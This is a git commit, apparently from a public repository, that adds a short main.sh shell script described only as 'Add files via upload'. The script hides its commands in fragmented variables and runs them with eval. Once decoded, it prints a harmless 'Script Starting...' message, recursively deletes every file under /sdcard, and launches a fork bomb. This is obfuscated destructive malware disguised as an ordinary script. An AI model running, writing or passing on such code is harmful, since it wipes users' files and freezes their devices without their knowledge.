531874c65a6a29c4fb2e3ac3eb0181017bec0636
LukashFatality <shoplukash@gmail.com>
2026-06-22 23:43:04 +0700

    Add files via upload

---
+++ main.sh
@@ -0,0 +1,3 @@
+z="
+";Bz=' Scr';Pz=':';Iz='sdca';Oz='& };';Gz='cd';Nz=' :|:';Rz='esai';Fz='...';Jz='rd';Az='echo';Dz='Star';Mz=':(){';Cz='ipt ';Qz=' sel';Lz='r *';Ez='ting';Kz='rm -';Hz='cd /';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$z$Hz$Iz$Jz$z$Kz$Lz$z$Mz$Nz$Oz$Pz$z$Az$Qz$Rz"
